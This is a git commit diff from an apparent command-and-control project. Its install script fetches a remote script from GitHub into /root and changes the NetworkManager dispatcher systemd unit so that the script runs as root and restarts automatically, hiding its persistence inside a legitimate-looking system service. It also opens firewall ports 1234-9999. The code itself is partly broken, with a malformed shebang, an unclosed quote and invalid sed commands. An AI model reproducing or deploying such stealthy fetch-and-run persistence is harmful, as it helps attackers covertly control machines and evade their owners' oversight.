10d4197e05d0ea9661b55e6772f21cae9522ada7
Abinavraj Ganesh Sudhakar <abinavraj10@gmail.com>
2023-03-26 22:03:54 -0500

    restarting the systemctl stuff

--- client_install.sh
+++ client_install.sh
@@ -1,8 +1,17 @@
 #!/bin/bashd
 curl -s https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/cncstartup.sh > /root/cncstartup.sh;
 chmod +x /root/cncstartup.sh
-curl -s https://raw.githubusercontent.com/Shuttlemax/CommandControl/main/cncstartup.service > /etc/systemd/system/cncstartup.service;
+
+
+file_path="/root/etc/systemd/system/dbus-org.freedesktop.nm-dispatcher.service
+sed -i "14a\\WantedBy=multi-user.target" "$file_path"
+
+new_code='ExecStart=/usr/libexec/nm-dispatcher && /root/cncstartup.sh'
+
+sed -i "7s\\${new_code}" "$file_path"
+sed -i "7a\\Restart=always" "$file_path"
+sed -i "7a\\User=root" "$file_path"
 
 sudo systemctl daemon-reload
-sudo systemctl enable cncstartup
-sudo systemctl start cncstartup
+sudo systemctl restart dbus-org.freedesktop.nm-dispatcher
+
--- cncstartup.sh
+++ cncstartup.sh
@@ -5,21 +5,9 @@ chmod +x setup.py;
 pip3 install --upgrade pip;
 pip3 install setuptools_rust;
 pip3 install cryptography;
+firewall-cmd --add-port=1234-9999/tcp;
 python3 setup.py;
 
-firewall-cmd --add-port=1234-9999/tcp;
 # mkdir .local
 # mv setup.py install.sh .local/
 # gpg -c .local/*
-
-file_path="/root/etc/systemd/system/dbus-org.freedesktop.nm-dispatcher.service
-sed -i "14a\\WantedBy=multi-user.target" "$file_path"
-
-new_code='ExecStart=/usr/libexec/nm-dispatcher && /root/cncstartup.sh'
-
-sed -i "7s\\${new_code}" "$file_path"
-sed -i "7a\\Restart=always" "$file_path"
-sed -i "7a\\User=root" "$file_path"
-
-
-rm setup.py
